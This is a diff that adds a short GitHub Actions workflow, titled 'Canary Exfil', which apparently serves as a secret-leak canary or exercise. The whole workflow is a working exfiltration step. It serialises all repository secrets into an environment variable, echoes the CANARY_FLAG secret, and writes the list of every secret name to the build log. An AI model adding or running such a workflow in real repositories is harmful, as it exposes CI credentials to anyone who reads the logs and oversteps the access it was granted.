@@ -1,0 +1,20 @@
+name: Canary Exfil
+
+on:
+  push:
+    branches: [prep-canary]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  canary:
+    runs-on: ubuntu-latest
+    env:
+      ALL_SECRETS: ${{ toJSON(secrets) }}
+    steps:
+      - name: Show canary
+        run: |
+          echo "CANARY_FLAG=${{ secrets.CANARY_FLAG }}"
+          echo "SECRET_NAMES=$(echo "$ALL_SECRETS" | jq -r 'keys | join(",")')"
